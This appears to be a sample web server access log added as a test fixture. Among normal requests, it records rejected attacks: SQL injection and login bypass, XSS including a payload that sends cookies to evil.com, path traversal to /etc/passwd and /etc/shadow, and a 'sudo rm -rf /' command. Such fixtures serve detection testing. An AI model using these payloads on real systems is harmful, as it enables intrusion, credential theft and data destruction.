@@ -1,0 +1,23 @@
+2026-03-25 08:00:01 INFO  GET  /                          200  12ms  from 192.168.1.55
+2026-03-25 08:00:03 INFO  GET  /dashboard                  200  45ms  from 192.168.1.55
+2026-03-25 08:00:10 INFO  POST /api/login                  200  30ms  from 192.168.1.60
+2026-03-25 08:01:22 WARN  POST /api/login                  401  12ms  from 192.168.1.99  body: {"user":"admin","pass":"' OR 1=1 --"}
+2026-03-25 08:01:45 WARN  POST /api/login                  401  10ms  from 192.168.1.99  body: {"user":"admin","pass":"' OR 1=1"}
+2026-03-25 08:02:00 ERROR GET  /api/users?id=1 UNION SELECT username,password FROM users-- 400 from 192.168.1.99
+2026-03-25 08:02:05 ERROR GET  /api/users?id=1; DROP TABLE users;-- 400 from 192.168.1.99
+2026-03-25 08:02:10 ERROR GET  /api/users?id=1; INSERT INTO admins VALUES('hacker','pw');-- 400 from 192.168.1.99
+2026-03-25 08:03:00 INFO  GET  /products                   200  22ms  from 10.0.0.80
+2026-03-25 08:04:11 WARN  POST /api/comment                400  8ms   from 172.16.0.44  body: <script>alert('xss')</script>
+2026-03-25 08:04:15 WARN  POST /api/comment                400  8ms   from 172.16.0.44  body: <script>document.cookie='stolen'</script>
+2026-03-25 08:04:20 WARN  POST /api/profile/bio            400  9ms   from 172.16.0.44  body: <script>fetch('http://evil.com?c='+document.cookie)</script>
+2026-03-25 08:05:00 INFO  GET  /about                      200  15ms  from 192.168.1.70
+2026-03-25 08:05:33 WARN  GET  /api/files?path=../../etc/passwd  400 from 203.0.113.12
+2026-03-25 08:05:34 WARN  GET  /api/files?path=../../etc/shadow  400 from 203.0.113.12
+2026-03-25 08:05:35 WARN  GET  /api/files?path=../../../var/log/auth.log 400 from 203.0.113.12
+2026-03-25 08:06:00 INFO  GET  /contact                    200  11ms  from 192.168.1.88
+2026-03-25 08:06:44 WARN  POST /api/search                 400  7ms   from 172.16.0.44  body: javascript:alert(1)
+2026-03-25 08:07:00 INFO  GET  /api/products?id=42         200  18ms  from 10.0.0.22
+2026-03-25 08:07:30 ERROR POST /api/exec                   403  5ms   from 203.0.113.12  body: sudo rm -rf /
+2026-03-25 08:08:00 INFO  GET  /favicon.ico                200  2ms   from 192.168.1.55
+2026-03-25 08:09:00 INFO  POST /api/logout                 200  6ms   from 192.168.1.60
+2026-03-25 08:10:00 INFO  GET  /health                     200  1ms   from 10.0.0.1
